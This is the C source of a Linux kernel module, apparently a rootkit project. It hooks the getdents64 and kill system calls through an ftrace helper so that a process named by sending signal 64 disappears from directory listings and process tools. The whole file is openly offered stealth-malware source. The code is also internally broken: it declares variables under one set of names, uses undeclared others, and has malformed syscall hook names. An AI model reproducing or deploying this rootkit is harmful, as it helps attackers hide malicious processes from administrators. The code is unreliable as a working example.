/* Copyright (C) 2023 Sean Kannanaika; - All Rights Reserved
 * You may use, distribute and modify this code under the fact
 * that code and knowledge should not be owned by anyone.  Have
 * at it viewers of my code. Do whatever the hell you want.
 */

//necessary library includes
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/version.h>
#include <linux/namei.h>
#include <linux/list.h>
#include <linux/dirent.h>
#include <linux/tcp.h>
#include <linux/kallsyms.h>
#include "lib/ftrace_helper.h"

//setting up moudle information for kernel module
MODULE_LICENSE("GPL");
MODULE_AUTHOR("Sean Kannanaikal");
MODULE_DESCRIPTION("Linux Kernel Hacking Hiding Directories");
MODULE_VERSION("0.01");

//function pointer to system call getdents64 which is used by user mod programs to gett directory items and kill to communicate with the kernel module
static asmlinkage long(*orig_getdents64)(const struct pt_regs *);
static asmlinkage long(*orig_kill)(const struct pt_regs *);

//a buffer to hold the value of the pid that is desired to be hidden
char hide_pid[NAME_MAX];

/*
@param a struct pt_regs which is used by the kernel to pass
prametrs to system calls via registers
@returns integer success(0) or failure(1) 
This function is the hook that is installed in place of the systemcall
getdents64 and will go through and hide any directories that have the defined
by hide_pid above
*/
static asmlinkage int hook_getdents64(const struct pt_regs * regs){
	//creating various pointers to directory enetries
	struct linux_dirent64 __user *process_directory_entry = (struct linux_dirent64 *)regs->si;
	struct linux_dirent64 *process_directory_entry_kernel_buffer = NULL;
	struct linux_dirent64 *process_current_directory = NULL;
	struct linux_dirent64 *process_previous_directory = NULL;
	long process_error;

	unsigned long offset = 0;

	//run the original system call and obtain the result
	int result = orig_getdents64(regs);
	directory_entry_kernel_buffer = kzalloc(result, GFP_KERNEL);

	if((result <= 0) || (directory_entry_kernel_buffer == NULL)){
		return result;
	}
	
	//copy over information into kernel buffer
	error = copy_from_user(directory_entry_kernel_buffer, directory_entry, result); //allocate a kernel buffer to obtain data from userland
	if(error){
		goto done;
	}
	//loop through and check if it matches the pid of hide_pid ...
	while((offset < result) && ((strcmp(hide_pid, "") != 0))){
		current_directory = (void *)directory_entry_kernel_buffer + offset;

		if(memcmp(hide_pid, current_directory->d_name, strlen(hide_pid)) == 0){
				
				//if it does then effectivelly remove the directory by altering the value of d_reclen to a value of the next directory after hide_pid proc
				if(current_directory == directory_entry_kernel_buffer){
					result -= current_directory->d_reclen;
					memmove(current_directory, (void *)current_directory + current_directory->d_reclen, result);
					continue;
				}

				previous_directory->d_reclen += current_directory->d_reclen;

		}else{
			previous_directory = current_directory;
		}


		offset += current_directory->d_reclen;
	}

	//copy the modified kernel buffer back to userland
	error = copy_to_user(directory_entry, directory_entry_kernel_buffer, result);
	if(error){
		goto done;
	}

	done: 
		kfree(directory_entry_kernel_buffer);
		return result;
}
/*
@param a struct pt_regs which is used by the kernel to pass
prametrs to system calls via registers
@returns integer success(0) or failure(1) 
This function is the hook that is installed in place of the systemcall
kill and will determine which pid to hide 
*/
static asmlinkage int hook_kill(const struct pt_regs *regs){

	pid_t desiredPID;

	int sig;
	sig = regs->si;
	desiredPID = regs->di;

	//if signal value of 64 then place the desired pid into the hide_pid buffer
	if(sig == 64){
		sprintf(hide_pid, "%d", desiredPID);
		return 0;
	}

	return orig_kill(regs);
}

//array for defining hooks according to xcellerators ftrace helper library function
static struct ftrace_hook hooks[] = {
	HOOK("__64_sys_kill", hook_kill, &orig_kill),
	HOOK("__64_sys_getdents64",  hook_getdents64, &orig_getdents64),
};

//init function to run upon iitilaization of kernel module will install function hook
static int __init hide_process_init(void){
	int error; 
	error = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
	if(error){
		return error;
	}
	return 0;
}

//exit function to run upon removal of kernel module will uninstall function hooks
static void __exit hide_process_exit(void){
	fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
}

//setting init and exit as corresponding functions for initalization and exit
module_init(hide_process_init);
module_exit(hide_process_exit);
